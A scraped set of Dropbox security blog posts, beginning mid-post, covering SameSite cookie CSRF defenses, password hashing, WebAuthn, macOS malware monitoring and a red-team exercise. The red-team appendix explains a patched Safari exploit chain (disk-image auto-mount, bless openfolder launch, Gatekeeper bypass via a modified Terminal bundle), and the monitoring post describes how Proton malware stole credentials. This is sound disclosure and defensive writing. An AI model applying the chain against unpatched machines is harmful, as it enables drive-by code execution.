cookie as SameSite with enforcement mode strict on login. Candidate design #1 isn’t ideal as a benign cross-site GET requests treat the user as logged out even if they were logged in. Use lax enforcement mode for session_cookie instead of strict . As stated earlier, this would only give us basic CSRF protection, and wouldn’t help us with cross-origin information leakage attacks like cross-site search attacks and JSON hijacking with AJAX GET requests. Further, it’s weaker than our earlier CSRF protection as it doesn’t work for unauthenticated users (e.g. it doesn’t provide a defense against login CSRF attacks). Candidate design #2: Dropbox sets the session cookie as SameSite with enforcement mode lax on login. CSRF defenses will only work for authenticated requests, e.g. the first login request could have been a cross-site request. Have the CSRF cookie csrf_cookie as a SameSite cookie in strict enforcement mode. This, however, makes it harder to incrementally roll out and deal with unexpected failures. Further, this approach doesn’t work because we cryptographically bind the CSRF token to session_cookie to avoid session fixation. When we see the presence of session_cookie , but the absence or invalidity of csrf_cookie , we suspect session fixation and log the user out. Therefore, simple cross-site GET requests will still fail. Candidate design #3: Dropbox sets the CSRF cookie as SameSite with enforcement mode strict on login. Candidate design #3 isn’t ideal because we always check whether the session cookie was cryptographically bound to the CSRF token, even on benign GET requests. Instead, we opted to introduce a new cookie, __Host-samesite_cookie . This cookie is SameSite with enforcement mode as strict . We set this cookie on all browsers that support same-site cookies, and we validate this cookie on every relevant request on the same browsers. The value of this cookie is derived from the CSRF token. We validate the same-site cookie by checking for its presence as well as the correctness of its value. We check for the value to defend against session fixation in case a cookie with the same name got set by an attacker previously. Final design: Introduce a new cookie with SameSite set to strict and value derived from the CSRF token. __Host-samesite_cookie has an enforcement mode strict , which means it does not get sent on benign cross-site GET requests (e.g. visiting a Dropbox public link from an external page). This is fine, as we can control enforcement on server-side. If the request is a benign GET request but __Host-samesite_cookie is absent, we can still allow the request to pass through. However, if it’s a state-changing POST request and __Host-samesite_cookie is absent, we can treat this as a CSRF error. We can control enforcement on the server side. Benign GET requests will be allowed, as we can ignore samesite protection on non-AJAX GET requests. As an aside, we made __Host-samesite_cookie a __Host-prefix cookie . A __Host- prefix cookie is a cookie that must only be sent to the host that sent the cookie. JavaScript on a subdomain of www.dropbox.com cannot set this cookie. If both csrf_cookie and __Host-samesite_cookie are valid, we can be confident that no session fixation attacks have occurred. Rollout Dealing with cookie authentication is very risky. It could create many availability and security issues. In the worst cases, it could lock many users out (and force them to manually reset their cookies), log users into another user’s account, or completely disable our CSRF defenses! Therefore, we decided to roll out same-site cookie defenses in two stages: first in “warnings-only” mode, where we log all errors, and later in “enforcement” mode when we see no unexpected errors. Further, we would want to be flexible in terms of what kinds of requests we would like to enforce the same-site check for. Enabling the same-site check for POST requests only would be equivalent to our current CSRF check, but wouldn’t necessarily be a defense against cross-origin information leakage or be helpful with entry-point investigation. To recap, we added a new cookie __Host-samesite_cookie for browsers that support the cookie. The cookie is SameSite with enforcement mode strict . Its value is derived from csrf_cookie . For the following requests, we check for presence of __Host-samesite_cookie and validate: If the request method is “POST”, and the route is NOT whitelisted for skipping CSRF protection, report a CSRF error if __Host-samesite_cookie is invalid. (Note that we allow some logging routes to skip CSRF protections.) If the request is AJAX and the request method is “GET”, report a potential cross-origin information leakage error if __Host-samesite_cookie is invalid. If the request is non-AJAX and the request method is “GET”, log the route as a potential entry point if __Host-samesite_cookie is invalid. Copy if not is_present_and_valid(cookies.get(\"__Host-samesite_cookie\")):\r\n  if request.method == \"POST\" and not skip_csrf_check(route): # Case 1\r\n    report(\"CSRF error\", route)\r\n  elif request.type == \"AJAX\" and request.method == \"GET\": # Case 2\r\n    report(\"Cross-origin error\", route)\r\n  elif request.type != \"AJAX\" and request.method == \"GET\": # Case 3\r\n    log(\"entry_points_log\", route)\r\n  else:\r\n    pass In case (1), we noticed minimal false alarms, so we switched from warnings to enforcement mode, raising an HTTP 403 in case of a violation. For case (2), we noticed that a few AJAX GET requests, such as the ones used by the Saver are cross-site by design. We whitelisted these few endpoints from the same-site check. Further, we noticed on service worker AJAX GET fetches, __Host-samesite_cookie wasn’t sent. We filed a bug report on Chrome. For those service worker routes, instead of relying on the cookie check, we added an additional header to block cross-site requests. After this, we were confident that we could roll this out in enforcement mode. For case (3), most websites have very few “toplevel” pages like https://www.dropbox.com and https://www.dropbox.com/help , and many pages users navigate to from these base pages, e.g. https://www.dropbox.com/team/admin/members , but do not visit directly. We call these toplevel pages entry points . Enforcing that users can visit non-entry points only by navigating to from entry points can reduce the attack surface of a website. By leveraging same-site checks for all non-AJAX GET routes, we found a few non-entry points, such as: routes a Dropbox team administrator visits to manage their team members’ accounts. routes in our support flow, where the user answers a series of questions before contacting customer service some legacy routes that relied on clicking on an “are you sure?” yes/no dialog box before performing an action However, we noticed that our website has much fewer non-entry points than we expected. We suspect that modern web applications might not have many non-entry points, but we’d love to hear your thoughts. Conclusion Same-site cookies are a convenient way to defend against a variety of attacks using cross-origin requests. Because it’s not supported on all browsers, it’s best as a defense in depth measure. We hope that other browsers will implement this feature in the future. Rolling out out same-site cookie defenses on top of existing CSRF defenses should give added security benefits without disrupting availability. For reasons outlined in this post, we recommend adding a new cookie, with SameSite in strict enforcement mode, and controlling the actual same-site enforcement on the server side. This cookie should preferably be a __Host-prefix cookie and its value should preferably be derived from the CSRF token. Dropbox is leveraging the security benefits of same-site cookies made possible by new browsers. Security is core to our company, and we’re excited to add another layer of protection for our users and their data. // Tags Security Cookies // Copy link Link copied Link copied", "date": "2017-03-16"},
{"website": "Dropbox", "title": "How Dropbox securely stores your passwords", "author": ["Devdattaakhawe"], "link": "https://dropbox.tech/security/how-dropbox-securely-stores-your-passwords", "abstract": "Why not use {scrypt, argon2} over bcrypt? Why is the global pepper used for encryption instead of hashing? Moving forward It’s universally acknowledged that it’s a bad idea to store plain-text passwords. If a database containing plain-text passwords is compromised, user accounts are in immediate danger. For this reason, as early as 1976, the industry standardized on storing passwords using secure, one-way hashing mechanisms (starting with Unix Crypt). Unfortunately, while this prevents the direct reading of passwords in case of a compromise, all hashing mechanisms necessarily allow attackers to brute force the hash offline, by going through lists of possible passwords, hashing them, and comparing the result. In this context, secure hashing functions like SHA have a critical flaw for password hashing: they are designed to be fast. A modern commodity CPU can generate millions of SHA256 hashes per second. Specialized GPU clusters allow for calculating hashes at a rate of billions per second . Over the years, we’ve quietly upgraded our password hashing approach multiple times in an ongoing effort to stay ahead of the bad guys. In this post, we want to share more details of our current password storage mechanism and our reasoning behind it. Our password storage scheme relies on three different layers of cryptographic protections, as the figure below illustrates. For ease of elucidation, in the figure and below we omit any mention of binary encoding (base64). Multiple layers of protection for passwords We rely on bcrypt as our core hashing algorithm with a per-user salt and an encryption key (or global pepper ), stored separately. Our approach differs from basic bcrypt in a few significant ways. First, the plaintext password is transformed into a hash value using SHA512 . This addresses two particular issues with bcrypt. Some implementations of bcrypt truncate the input to 72 bytes, which reduces the entropy of the passwords. Other implementations don’t truncate the input and are therefore vulnerable to DoS attacks because they allow the input of arbitrarily long passwords. By applying SHA, we can quickly convert really long passwords into a fixed length 512 bit value, solving both problems. Next, this SHA512 hash is hashed again using bcrypt with a cost of 10 , and a unique, per-user salt. Unlike cryptographic hash functions like SHA, bcrypt is designed to be slow and hard to speed up via custom hardware and GPUs. A work factor of 10 translates into roughly 100ms for all these steps on our servers. Finally, the resulting bcrypt hash is encrypted with AES256 using a secret key (common to all hashes) that we refer to as a pepper . The pepper is a defense in depth measure. The pepper value is stored separately in a manner that makes it difficult to discover by an attacker (i.e. not in a database table). As a result, if only the password storage is compromised, the password hashes are encrypted and of no use to an attacker. Why not use {scrypt, argon2} over bcrypt? We considered using scrypt, but we had more experience using bcrypt. The debate over which algorithm is better is still open, and most security experts agree that scrypt and bcrypt provide similar protections. We’re considering argon2 for our next upgrade: when we moved to our current scheme, argon2 hadn’t (yet) won the Password Hashing Competition . Additionally, while we believe argon2 is a fantastic password hashing function, we like that bcrypt has been around since 1999 without any significant vulnerabilities found. Why is the global pepper used for encryption instead of hashing? Recall that the global pepper is a defense in depth measure and we store it separately. But storing it separately also means that we have to include the possibility of the pepper (and not the password hashes) being compromised. If we use the global pepper for hashing, we can’t easily rotate it. Instead, using it for encryption gives us similar security but with the added ability to rotate. The input to this encryption function is randomized, but we also include a random initialization vector (IV). Going forward, we’re considering storing the global pepper in a hardware security module (HSM). At our scale, this is an undertaking with considerable complexity, but would significantly reduce the chances of a pepper compromise. We also plan to increase our bcrypt strength in our next update. Moving forward We believe this use of SHA512, plus bcrypt, and AES256 is currently among the strongest and most future-proof methods to protect passwords. At the same time, we know that attackers are continuously evolving—and our defenses will too. Our password hashing procedure is just one of many measures we use to secure Dropbox. We’ve deployed additional safeguards against online brute-force attacks like rate-limiting password attempts, captchas, and a range of abuse mitigations. Like the diagram above, there are many layers to maintaining robust security, and we’re actively investing in all of them. We’d love to hear your thoughts. // Tags Security Passwords // Copy link Link copied Link copied", "date": "2016-09-21"},
{"website": "Dropbox", "title": "Introducing WebAuthn support for secure Dropbox sign in", "author": ["Brad Girardeau"], "link": "https://dropbox.tech/security/introducing-webauthn-support-for-secure-dropbox-sign-in", "abstract": "The easiest way to keep a secret is to not tell it to anyone. Unfortunately passwords don’t work that way. Every time you sign in you have to tell the website your password, making it more challenging to keep the secret safe. That’s why we recommend turning on two-step verification for your account, which adds an extra layer of difficulty for anyone who has guessed, eavesdropped on, or tricked you into giving them your password. And it’s why we’re excited today to announce support for WebAuthn (“Web Authentication”) in two-step verification, a new standard for strong authentication on the web. In most forms of two-step verification, a user enters a one time code after providing their username and password, and before being signed in. While easy to adopt, using one time codes for two-step verification has weaknesses. For example, a fake Dropbox sign in page could ask for your username, password, and the two-step code. That’s why Dropbox was one of the first services to adopt Universal 2nd Factor (U2F) for security keys in 2015. Security keys prevent phishing by giving Dropbox cryptographic proof that you both have your key and are using it on https://www.dropbox.com (instead of a phishing page). Introducing WebAuthn This cryptographic proof makes U2F security keys a very strong form of two-step verification, but adoption of U2F has been limited by browser and hardware support. We hope WebAuthn will change that. It’s a new way to interact with security keys and other “authenticators” that standardizes and builds on key parts of U2F, the result of a collaboration between the W3C and FIDO Alliance . While for years only Chrome supported U2F, browser vendors have committed to bringing WebAuthn to Chrome, Firefox, and Edge. More and more devices will have WebAuthn support built in, bringing stronger security to the many users who don’t own special security keys. These could include your laptop or phone, which might prompt you for your fingerprint or a PIN code as part of the authentication process. But this only matters if services actually let you use WebAuthn to securely sign in. Today, Dropbox is proud to help lead the way. What does this mean for me? You’ll now be able to use more types of security keys on more browsers for two-step verification. That starts with support for security keys in Firefox 60, releasing on May 9th. You can use security keys previously registered with U2F and register new ones with WebAuthn. Chrome and Edge support for WebAuthn will be coming soon, and you can still use your security keys in Chrome today with U2F. This means that as a user, you’ll enjoy much stronger sign in security on more browsers. Unlike passwords, the secrets used in WebAuthn never leave your security key, so they are significantly harder to steal. And before using a secret to authenticate to Dropbox, the security key checks that you are signing in to the right place. You can feel confident when signing in that it’s really us, and we can be confident it’s really you. Will this replace passwords? Right now, we’re using WebAuthn to make it easier for you to add an extra level of security to your account. A natural question is if we still need passwords too. Your credentials could be stored on a device like your phone, laptop, or security key, and services could use WebAuthn to sign in to your account after you scan your fingerprint or input a PIN on the device. There are still many security and usability factors to consider in these scenarios before replacing passwords entirely, and we believe that enabling WebAuthn for two-step verification strikes the right balance for most users right now. How do I use WebAuthn? To start using security keys that support WebAuthn on Dropbox, take a look at our Help Center article . Curious to know more? We collected a few helpful references with more technical details for you below: W3C Web Authentication Specification MDN Web Docs for Web Authentication Security Keys [from ImperialViolet] W3C + FIDO Alliance WebAuthn Press Release // Tags Security Passwords Webauthn U2f // Copy link Link copied Link copied", "date": "2018-05-08"},
{"website": "Dropbox", "title": "MacOS monitoring the open source way", "author": ["Michael George"], "link": "https://dropbox.tech/security/macos-monitoring-the-open-source-way", "abstract": "Let’s say a machine in your corporate fleet gets infected with malware. How would you detect it? How could you find out what happened on the machine? What did the malware do? Did it steal your browser’s passwords? What network connections did the malware make? Was it looking for crypto currency? By having good telemetry and a good host monitoring solution for your machines you can collect the context necessary to answer these important questions. Proper host monitoring on macOS can be very difficult for some organizations. It can be hard to find mature tools that proactively detect security incidents. Even when you do find a tool that fits all your needs, you may run into unexpected performance issues that make the machine nearly unusable by your employees. You might also experience issues like having hosts unexpectedly shut down due to a kernel panic. Even if you are able to pinpoint the cause of these issues you may still be unable to configure the tool to prevent the issue from recurring. Due to difficulties like these at Dropbox, we set out to find an alternative solution. One of the first things we did was create a list of requirements and success criteria: Stability and minimal performance impact Kernel panics and obvious delays or other lockups are certainly not acceptable Record interesting activity on the host Process spawning Filesystem Modifications Network activity Details about configuration settings and installed applications Record details about these observables which would tell us: Date and time How observations are related (parent-child relationships, or shared keys which connect events, like process id) Additional details to assess the relevance or impact of the event During the investigation we reviewed a number of tools that could solve some of our problems, but none of the tools could solve all of our problems. After careful review we decided that we didn’t want to reinvent the wheel and that having multiple tools that each solved a specific requirement would better serve our needs. We eventually landed on 3 open source tools: osquery, Santa, and the OpenBSM/Audit system; with each tool serving a specific purpose: osquery provides periodic snapshots describing changes to the state of a machine Santa provides real-time process launch events containing details about the executing binary OpenBSM/Audit is real-time system call monitoring module in the macOS kernel that can provide networking, file operations, administrative events, and other system interactions. osquery osquery is an open source operating system instrumentation framework for Windows, macOS, Linux, and FreeBSD by Facebook. This tool allows users to query the state of their system via a SQL interface. Some of the useful features of this service are: The ability to parse preference and configuration files, list installed applications, current running processes, file path information, and installed browser plugins. This is useful if we are looking for suspicious applications or if we want to know if a machine has some specific configuration settings. osquery by default comes with several packs of useful queries and the core application is regularly being updated to include new features. Using osquery we can perform queries to search for IOCs (Indicators of Compromise) on a host such as the recent Proton malware : Example query looking for proton malware (from osquery attack pack) With osquery, we can get a lot of information about the current state and possibly the previous states of the machine. This still leaves us with a gap; what about events that occur between scheduled OSQuery queries? Here comes Santa Claus 🎵! Santa Santa is an open source tool developed by Google specifically for macOS. It provides information on executed processes and some disk events. For processes, Santa can provide the following info: sha256 hashes of the executed binary Quarantine URLs — The full URL for where the binary came from if it was downloaded PID — process id PPID — parent process id, which is important for building process trees The “Common Name” field and sha256 hash of the cert used to sign the binary Another powerful feature that we won’t cover here is Santa’s ability to prevent execution of binaries (binary blacklisting and whitelisting). Using the data we collect from Santa we can investigate most execution actions performed on hosts. Interestingly, this lets us see execution events from the recent Proton malware such as the exfiltration (“exfil”) process: Proton uses a cURL with a File post to exfil data off hosts We can even see what was exfil’d from hosts, such as 1Password vaults, Chrome browser history, etc. Proton used zip to copy 1Password vaults among other sensitive files Using the sha256 hashes provided in the Santa logs we can investigate the reputation of some of the files dropped by Proton. Installing Proton malware Investigating hash in Virustotal OpenBSM/Audit With osquery and Santa we have a really good picture of the executions that occur on a host. However, we are still missing some information about what actions are performed by specific applications with respect to network connections and filesystem interactions. osquery can give us some of this information querying the process_open_files table or the process_open_sockets table but there is still a chance we could miss events that happen between query intervals. Therefore, we need a real-time pipeline like the one that Santa gives us. To get this data we leverage the OpenBSM/Audit (or audit) system. This subsystem is built into the macOS kernel and is based on OpenBSM. OpenBSM/Audit provides a real-time stream of information about the host’s activities. During configuration of audit, we will tell audit which audit class of system calls you want it to monitor. For example, if you wanted to monitor network events you would utilize the nt audit class. The nt audit class will create a stream of data in a binary format where you can use another tool provided with audit called auditreduce . This gives the ability to filter out information to specific audit events from the class and convert the binary data to human readable XML-formatted logs. After setting up the appropriate logging services for audit, you can configure audit to produce events for the missing pieces of our puzzle. You can make it monitor for file read, file create, file write, and network events to get a better understanding of system activity that a process is making. Proton malware storing stolen credentials before exfiltration Network call captured by the macOS audit system All of the above interactions could be seen using individual events, which is great. However, what if we combine these events into something more? An example of a process tree for a malicious office document By using timestamps, PID, PPID, Network events, and File events we can create process trees. Each of these process trees can tell a story about what happened when this process was executed. The example above is a common attack technique using office documents with malicious macros to pull malware from the internet and compromise hosts. Once we have a clear picture of what happened via the process trees we can make judgment calls on actions performed by applications. These applications could look legitimate but, in the observed execution context, may be malicious. At Dropbox we are strong proponents for open source software and even stronger proponents for security. Being worthy of trust is our #1 cultural value and is core to our mission as a security team. If you’re interested in working on hard problems, our security team is always hiring talented people . Further Reading: https://github.com/google/santa https://osquery.io/ https://opensource.apple.com/source/OpenBSM/OpenBSM-21/ https://blog.malwarebytes.com/threat-analysis/mac-threat-analysis/2017/05/handbrake-hacked-to-drop-new-variant-of-proton-malware/ https://www.virustotal.com/ // Tags Security Mac Host Monitoring // Copy link Link copied Link copied", "date": "2018-04-26"},
{"website": "Dropbox", "title": "Live-hacking Dropbox @ H1-3120", "author": ["Nathanial Lattimer"], "link": "https://dropbox.tech/security/live-hacking-dropbox-h1-3120", "abstract": "H1-3120 Most Valuable Hacker mrtuxracer ( Image source: HackerOne) In 2018, Dropbox has focused on improving our world-class bug bounty program. From increasing bounties to protecting our researchers , we’re always looking for more creative and meaningful ways to stay ahead of the game when it comes to running this program. As an example, we recently partnered with HackerOne to host their H1-3120 live-hacking event in Amsterdam. Live-hacking events let participants hack on a target—often in person—submit vulnerabilities, and receive bounties quickly, all during the course of the event. Live-hacking comes with a number of benefits over traditional bug bounty programs, such as real-time communication and relationship building, which makes finding vulnerabilities and receiving bounties much easier. The event was a huge success! We received plenty of stellar reports and doubled the highest amount we’ve ever paid in a single day for bug bounties. H1-3120 planning To prepare for the event, we sat down to determine how to get the most value possible out of the short time we had with the hackers. From that discussion, we came up with three objectives: Significantly increase the research scope for the event Provide a fast and efficient communication channel for the participants Offer information and guidance to aid in bug bounty research Increased scope Dropbox aims to have one of the most permissive scopes in the bug bounty world. Scope is the predefined set of targets that bug hunters are allowed to test. In addition to Dropbox assets, we've begun to migrate some of our external partners into scope as well. For H1-3120, we required more of our vendors to take on the challenge of participating in bug bounty research. Five SaaS vendors we use were placed in scope for the event, with Dropbox handling all of the triage and paying bounties for any reports. Both HackerOne staff and participants found this exciting. In fact, including vendors as part of the scope for a HackerOne live-hacking event had never been done before. For us, the decision just made sense: when Dropbox engages a vendor who will have access to sensitive Dropbox data, we hold them to very high security standards, including a commitment to welcome scrutiny by Dropbox and other security researchers. Efficient communication We wanted to ensure that our H1-3120 participants had the best possible opportunity to find vulnerabilities in Dropbox and our vendors. We made sure that someone was available to field questions over Slack the week prior to the event while the participants were doing reconnaissance. Additionally, we participated in a conference call with the hackers to answer questions and give advice. Information and guidance To help participants find more valuable bugs, we decided to show them a handful of vulnerabilities that Dropbox has had in the past as well as highlight places that we think have the highest risk for potential vulnerabilities. By getting more eyes on the least frequently tested parts of Dropbox, we help researchers—and ourselves—make Dropbox more secure. The event H1-3120 started off with a flurry of submissions. In the weeks prior, the hackers were already trying to find vulnerabilities in both Dropbox and our vendors. The plethora of submissions at H1-3120 showcased that effort. Within the first 30 minutes of the event, over 50 reports came in ranging from simple information disclosure to cross-site scripting. The hackers even found a remote code execution in the perimeter of one of our vendors! The Dropbox Security team had a blast meeting researchers, hunting complex vulnerabilities, and improving the security of our product. After the last reward was paid out, Dropbox had distributed more than $80,000 in bounties to researchers at the event, with over $5,000 of that donated to charities. Conclusion The real value we’ve experienced from the event is the overall uptick in interest in our bug bounty program. Since H1-3120, we’ve had a 23% increase in submissions per day to our program, including a report from bug hunter detroitsmash with a $9,000 bounty. In addition our new relationships with the researchers are proving to be invaluable. We’ve had a number of conversations with our more frequent bug bounty participants leading to HackerOne reports that we’ve subsequently awarded on. We’re planning to connect more with our recurring researchers to build on these important relationships. Dropbox is committed to ensuring our bug bounty program draws the best bug hunting talent from around the world. When friendly hackers find the vulnerabilities before the bad actors do, that’s a huge win for the entire security community. Thanks to all the participants of H1-3120 as well as all the security researchers that send us reports every day! // Tags Security Bug Bounty Program // Copy link Link copied Link copied", "date": "2018-09-10"},
{"website": "Dropbox", "title": "Offensive testing to make Dropbox (and the world) a safer place", "author": ["Chris Evans"], "link": "https://dropbox.tech/security/offensive-testing-to-make-dropbox-and-the-world-a-safer-place", "abstract": "Appendix Dropbox invests heavily in our security program. We have lots of teams dedicated to securing Dropbox, each working on exciting things. Some recent examples covered on our tech blog include: Our Product Security team roll ed out support for WebAuthn to boost user adoption of two-step verification and upleveled our industry-leading public bug bounty program Because security is everyone’s responsibility, our Security Culture team helps our employees make consistently secure and informed decisions that protect Dropbox, our users, and our employees Our Detection and Response Team (DART) implementation of extensive instrumentation throughout our infrastructure to catch any indications of compromise. And that’s just a few teams so far—you’ll hear from all of our teams in upcoming blog posts. This post will focus on our Offensive Security team. These are the people that leverage real-world adversarial techniques to test and improve the effectiveness of our security program at Dropbox. We recently conducted an attack simulation as a red team exercise with a third-party vendor. Penetration testing is great for identifying unknown vulnerabilities in your systems and showing how susceptible they are to being exploited; however, the tester’s goals are typically limited to just that. What about post-exploitation? An attacker who wants access to our user data, for example, still has their work cut out for them. They need to learn how to navigate through our environments, breach other internal security barriers, exfiltrate data out of our networks, and do so without raising alarm. Or at least, if they do raise alarm, be able to accomplish their goals before we’re able to kick them out. We’ve invested a lot in our hardening, detection, alerting, and response capabilities at Dropbox. Even if an attacker breaks in and accesses various systems in our environments without triggering an alarm, we have extensive instrumentation to trace activity post-exploitation. So how do we know we’re doing a good job? That’s the kind of testing we were going for with our most recent attack simulation. Our testing goals included measuring the steady-state of our detection and alerting program, as well as measuring our team’s response when a breach has been identified. Identifying new ways to break into Dropbox was in scope for this engagement, but even if none were found, we were going to simulate the effects of a breach by just planting malware ourselves (discretely, of course, so as not to tip off the detection and response team). However, we didn’t have to simulate this breach. Our third-party partner, Syndis , found vulnerabilities in Apple software we use at Dropbox that didn’t just affect our macOS fleet, it affected all Safari users running the latest version at the time—a so-called zero-day vulnerability ). When chained together, these vulnerabilities resulted in the ability for an attacker to run arbitrary code on a victim’s computer by having the victim simply visit a maliciously crafted web page. We notified Apple of these issues, and they were quick to acknowledge our report. Apple released fixes for the issues in about a month, which is much better than the industry norm of “within 90 days.” The issues were granted CVE s, and we’ve validated the fixes, as did Syndis. We provide details of the vulnerabilities and the validation of the fixes in the Appendix. This engagement was a win for us, for Apple, and for internet users on various levels. Not only did we get to test our defensive posture, we also made the internet safer by identifying and reporting vulnerabilities in macOS. Syndis went above and beyond in finding this exploit chain during our engagement, and using it during our attack simulation exercise allowed us to test our readiness against attacks using zero-day vulnerabilities. This is an excellent example of the security community becoming stronger because of good actors doing the right thing. Dropbox protects the data of more than 500 million registered users. We know that we are targeted by adversaries that could develop and use zero-day exploits against us, and we need to protect ourselves accordingly. The risk of getting hit with zero-day exploits is a reality of being connected to the internet, but detecting these is tricky. A powerful zero-day will always gain a foothold, so this was a test of our instrumentation for detecting and alerting on post-exploit activity. Our partner noted “Dropbox demonstrated admirable monitoring, detection, and incident response” after the engagement. Although our teams and systems performed well against this well-armed adversary, we won’t get complacent. Extensive independent validation will always be a core strategy of Dropbox Security Team, and we’ll continue to adapt and learn from each new incident. Appendix Timeline of disclosure February 19, 2018—Report vulnerabilities to Apple February 19, 2018—Apple acknowledges report February 21, 2018—Apple is provided with proof of concept February 21, 2018—Apple thanks us for the additional information and says they are investigating March 29, 2018—Apple releases security updates here . The vulnerabilities 1. Safari automatic download and mounting of disk images CoreTypes defines a list of a safe Uniform Type Identifiers (UTI) that will automatically be opened by Safari. These can be found in LSRiskCategorySafe . Of particular interest here is com.real.smil . If we check the Launch Services database with lsregister , we see this is defined in CoreTypes and described as “synchronized multimedia integration language,” and appears to be associated with the Real Player media application. A number of file extensions are associated with this UTI, including “.smi”. Copy $ touch a.smi\n$ mdls a.smi | grep -e \"kMDItemContentType\\s\\|kMDItemKind\"\nkMDItemContentType                 = \"com.real.smil\"\nkMDItemKind                        = \"Self Mounting Image\" We can see the “.smi” filetype has the com.real.smil content type, but it’s described as a “Self Mounting Image.” This is because on macOS 10.12.6 the Disk Image Mounter application also associates itself with this extension, and lists itself as the default handler for the extension. The Disk Image Mounter application specifies the com.apple.disk-image-smi UTI for “.smi” extensions, but the com.real.smil defined in CoreTypes takes precedence. This issue was assigned CVE-2017-13890. https://support.apple.com/en-us/HT208692 CoreTypes Available for: OS X El Capitan 10.11.6, macOS Sierra 10.12.6 Impact: Processing a maliciously crafted webpage may result in the mounting of a disk image Description: A logic issue was addressed with improved restrictions. CVE-2017-13890: Apple, Theodor Ragnar Gislason of Syndis 2. Mounting disk image causes application launch The bless utility is able to “set volume bootability and startup disk options.” An interesting option is --openfolder , which can be used to “Specify a folder to be opened in Finder when the volume is mounted by the system.” Despite that description, when the argument to --openfolder points to a loadable bundle, which are applications packaged as directories with names ending in “.bundle,” then the application will be launched instead of being opened in Finder. This effectively meant we now have a way to automatically launch applications by simply visiting a web page in Safari. However, the usefulness to an attacker is still limited at this point because they can’t launch arbitrary code. Gatekeeper protects against this kind of attack by only allowing applications downloaded from the app store and apps that are signed by known developers. Launch Services checks for these upon launching our application and throws the following error: For the exploit chain to work, a Gatekeeper bypass was needed to avoid this check. This was given CVE-2018-4176. https://support.apple.com/en-us/HT208692 Disk Images Available for: OS X El Capitan 10.11.6, macOS Sierra 10.12.6, macOS High Sierra 10.13.3 Impact: Mounting a malicious disk image may result in the launching of an application Description: A logic issue was addressed with improved validation. CVE-2018-4176: Theodor Ragnar Gislason of Syndis 3. Gatekeeper bypass Notice the message in the error above: “’evil’ can’t be opened because it is from an unidentified developer,” with a note that “evil” is on a disk image downloaded by Safari. Syndis then noticed a couple things: They could launch copies of signed application bundles, such as Terminal.app, located on our disk image. Modifying the Info.plist of the bundle does not invalidate the signature. With the Info.plist it is possible to specify which file extensions can be opened with an application. It’s also possible to register new file extensions, which will help ensure the application is the default handler. Upon launching the app, Launch Services registers the app and these file extensions associated in its database. This can be seen using the lsregister command: Copy ...\n--------------------------------------------------------------------------------\nContainer mount state: mounted\nbundle  id:            2740\n        Mach-O UUIDs:  67FFA762-AB52-31F0-AC80-E72008760B13\n        sequenceNum:   2740\n        FamilyID:      0\n        PurchaserID:   0\n        DownloaderID:  0\n        installType:   0\n        appContainer:  #\n        dataContainer: #\n        path:          /Volumes/bundle/Terminal.app\n        name:          Terminal\n        displayName:   Terminal\n...\n        bundle flags:  apple-internal  has-display-name  launch-disabled  (0000000000000103)\n...\n                {\n            CFBundleTypeExtensions =             (\n                workingpoc\n            );\n            CFBundleTypeRole = invalid;\n            LSIsAppleDefaultForType = 1;\n        },\n...\n}\n        library:       (null)\n        schemesList:   ssh, telnet, x-man-page\n...\n        --------------------------------------------------------\n        claim   id:            15108\n                name:          (null)\n                rank:          Default\n                roles:         Viewer  \n                flags:         apple-default  apple-internal  doc-type  \n                icon:          \n                bindings:      .workingpoc\n... This gives a way to register new file extensions and launch signed applications. However, we don’t yet have a way of launching our own applications or commands. Leveraging the Terminal app was the next logical step, considering it’s meant for running arbitrary commands. When trying to launch shell scripts with the techniques above however, Gatekeeper prevents execution because of the quarantine bit that’s set from being downloaded by Safari. Here’s the real trick—if we’re able to open a file with our new extension that’s associated with our copy of Terminal, then the quarantine bit is not checked, and it runs in the system’s version of Terminal without prompt. This was given CVE-2018-4175. https://support.apple.com/en-us/HT208692 LaunchServices Available for: OS X El Capitan 10.11.6, macOS Sierra 10.12.6, macOS High Sierra 10.13.3 Impact: A maliciously crafted application may be able to bypass code signing enforcement Description: A logic issue was addressed with improved validation. CVE-2018-4175: Theodor Ragnar Gislason of Syndis The exploit Syndis was able to chain these together in a two-stage exploit to achieve arbitrary code execution for a user who visits a specially crafted web page with Safari. The first stage includes a modified version of the Terminal app, which is registered as a handler for a new file extension (.workingpoc). In addition it would contain a blank folder called “test.bundle” which would be set as the default “openfolder” which automatically would open /Applications/Terminal.app without prompt. The second stage includes an unsigned shellscript with the extension “.workingpoc” which is then executed within the running Terminal application without prompt. Validating the fixes Apple provided fixes for the vulnerabilities identified with the update announced here, on March 29, 2018: https://support.apple.com/en-us/HT208692 CVE-2017-13890 The com.real.smil UTI appears to have been removed from CoreTypes. A quick check shows “.smi” files now have the appropriate content type: Copy $ mdls a.smi | grep -e \"kMDItemContentType\\s\\|kMDItemKind\"\nkMDItemContentType                 = \"com.apple.disk-image-smi\"\nkMDItemKind                        = \"Self Mounting Image\" And this can be further verified by comparing the Launch Services database between 10.12.6 and 10.13.4: 10.12.6 Copy claim   id:            3804\n                name:          Self Mounting Image\n                rank:          Default\n                roles:         Viewer  \n                flags:         apple-default  apple-internal  relative-icon-path  doc-type  \n                icon:          Contents/Resources/diskcopy-doc.icns\n                bindings:      com.real.smil, .smi 10.13.4 Copy claim   id:            22824\n                name:          Self Mounting Image\n                rank:          Default\n                roles:         Viewer  \n                flags:         apple-default  apple-internal  relative-icon-path  doc-type  \n                icon:          Contents/Resources/diskcopy-doc.icns\n                bindings:      com.apple.disk-image-smi, .smi As a result, Safari no longer automatically opens “.smi” files with the Disk Image Mounter application. CVE-2018-4176 Using the bless command to open an loadable bundle no longer causes the bundle to launch. Instead, the directory is opened with the Finder application, as the command says it will do. CVE-2018-4175 In 10.12.6 our script was launched without prompt in the second stage of our exploit. In 10.13.4 we are now presented with a warning that we have never launched this new application before: Even if the first two CVEs weren’t addressed, we consider a user who’s presented with this dialog after simply visiting a web page in Safari has been sufficiently warned that continuing is potentially unsafe. If we’re to click Open here, we notice the bundle flags for our modified Terminal no longer include launch-disabled in the Launch Services database: Copy ...\n--------------------------------------------------------------------------------\nContainer mount state: mounted\nbundle  id:            2740\n        Mach-O UUIDs:  67FFA762-AB52-31F0-AC80-E72008760B13\n...\n        path:          /Volumes/bundle/Terminal.app\n...\n        bundle flags:  apple-internal  has-display-name  (0000000000000003)\n... // Tags Security Offensive Testing Pen Testing // Copy link Link copied Link copied", "date": "2018-11-16"},
